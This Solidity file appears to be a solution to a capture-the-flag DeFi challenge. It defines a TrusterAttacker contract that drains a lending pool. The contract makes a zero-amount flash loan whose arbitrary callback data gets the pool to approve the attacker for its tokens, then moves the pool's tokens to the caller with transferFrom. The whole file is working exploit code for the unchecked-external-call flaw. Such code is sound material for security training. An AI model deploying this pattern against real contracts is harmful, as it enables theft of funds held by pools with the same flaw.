// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../truster/TrusterLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract TrusterAttacker {
    constructor(
        uint256 amount,
        address pool,
        address token
    ) {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), amount);
        TrusterLenderPool(pool).flashLoan(0, msg.sender, token, data);
        IERC20(token).transferFrom(pool, msg.sender, amount);
    }
}